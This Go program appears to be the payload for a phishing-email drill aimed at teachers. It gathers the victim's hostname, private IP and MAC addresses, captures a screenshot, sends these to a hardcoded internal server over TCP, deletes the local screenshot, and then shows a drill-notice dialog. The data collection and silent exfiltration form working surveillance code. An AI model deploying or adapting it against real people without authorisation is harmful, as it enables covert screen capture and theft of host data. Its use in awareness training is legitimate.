package main

import (
    "encoding/gob"
    "fmt"
    "github.com/gen2brain/dlgs"
    "github.com/vova616/screenshot"
    "image/png"
    "net"
    "os"
    "strings"
    "time"
)

type NetworkInfo struct {
    Time        string
    IPv4Address string
    Interface   string
    Hostname    string
    MacAddress  string
}

func main() {
    interfaces, err := net.Interfaces()
    if err != nil {
        fmt.Println("获取网络接口失败:", err)
        return
    }

    // 获取机器名称
    hostname, err := os.Hostname()
    if err != nil {
        fmt.Println("获取主机名失败:", err)
        return
    }

    // 创建 NetworkInfo 结构体实例的列表
    var networkInfos []NetworkInfo
    for _, iface := range interfaces {
        if strings.Contains(iface.Name, "Ethernet") || strings.Contains(iface.Name, "本地连接") || strings.Contains(iface.Name, "WLAN") || strings.Contains(iface.Name, "无线网络连接") {
            addrs, err := iface.Addrs()
            if err != nil {
                fmt.Println("获取IP地址失败:", err)
                continue
            }

            for _, addr := range addrs {
                var ip net.IP
                switch v := addr.(type) {
                case *net.IPNet:
                    ip = v.IP
                case *net.IPAddr:
                    ip = v.IP
                }

                if ip == nil || ip.IsLoopback() || ip.To4() == nil {
                    continue
                }

                if !ip.IsPrivate() {
                    continue
                }

                currentTime := time.Now().Format("2006-01-02 15:04:05")
                // 将信息添加到列表中
                networkInfos = append(networkInfos, NetworkInfo{
                    Time:        currentTime,
                    IPv4Address: ip.String(),
                    Interface:   iface.Name,
                    Hostname:    hostname,
                    MacAddress:  iface.HardwareAddr.String(),
                })
            }
        }
    }

    // 打印网络信息
    for _, info := range networkInfos {
        fmt.Printf("上钩时间: %s, IPv4 地址: %s, Mac地址: %s, 网口描述: %s, 主机名: %s\n", info.Time, info.IPv4Address, info.MacAddress, info.Interface, info.Hostname)
    }

    // 连接服务端
    serverAddr := "192.168.28.166:56600"
    conn, err := net.Dial("tcp", serverAddr)
    if err != nil {
        fmt.Println("连接到服务端失败:", err)
        return
    }
    defer conn.Close()

    // 创建编码器，将 NetworkInfo 结构体切片编码并发送到服务端
    encoder := gob.NewEncoder(conn)
    err1 := encoder.Encode(&networkInfos)
    if err1 != nil {
        fmt.Println("编码并发送数据失败:", err1)
        return
    }

    // 发送截图
    err = captureAndSendScreenshot(conn)
    if err != nil {
        fmt.Println("发送截图失败:", err)
        return
    }

    // 删除本地截图文件
    removeScreenshotFile("screenshot.png")

    Message()
}

func Message() {
    _, err := dlgs.Info("钓鱼演练", "此次为钓鱼邮件演练，请各位老师提高安全意识！！！")
    if err != nil {
        panic(err)
    }
}

func captureAndSendScreenshot(conn net.Conn) error {
    // 获取屏幕截图
    img, err := screenshot.CaptureScreen()
    if err != nil {
        return fmt.Errorf("截图失败: %v", err)
    }

    // 保存截图到文件
    imgFile, err := os.Create("screenshot.png")
    if err != nil {
        return fmt.Errorf("创建文件失败: %v", err)
    }
    defer imgFile.Close()

    // 将截图保存为 PNG 格式
    err = png.Encode(imgFile, img)
    if err != nil {
        return fmt.Errorf("保存截图失败: %v", err)
    }

    // 发送截图文件到服务端
    imgFile.Seek(0, 0) // 重置文件指针
    fileData, err := os.ReadFile("screenshot.png") // 读取文件内容
    if err != nil {
        return fmt.Errorf("读取文件失败: %v", err)
    }

    // 发送图片数据
    _, err = conn.Write(fileData) // 直接写入连接
    if err != nil {
        return fmt.Errorf("发送图片数据失败: %v", err)
    }

    return nil
}

// 删除本地截图文件
func removeScreenshotFile(filePath string) {
    err := os.Remove(filePath)
    if err != nil {
        fmt.Println("删除截图文件失败:", err)
    } else {
        fmt.Println("截图文件已删除")
    }
}
